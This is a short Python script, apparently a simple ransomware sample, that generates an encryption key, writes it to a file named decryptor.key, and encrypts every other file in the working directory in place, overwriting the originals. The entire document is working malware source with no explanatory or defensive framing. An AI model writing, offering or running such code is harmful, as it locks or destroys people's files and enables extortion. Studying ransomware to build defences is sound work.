from cryptography.fernet import Fernet
import os

key = Fernet.generate_key()
with open("decryptor.key", "wb") as key_file:
    key_file.write(key)

for each_file in os.listdir():
    if each_file != "ransomware.py" and each_file != "decrypt.py" and each_file != "decryptor.key" and os.path.isfile(each_file):
        with open(each_file, "r+b") as f:
            content = f.read()
            encrypted_content = Fernet(key).encrypt(content)
            f.seek(0)
            f.write(encrypted_content)
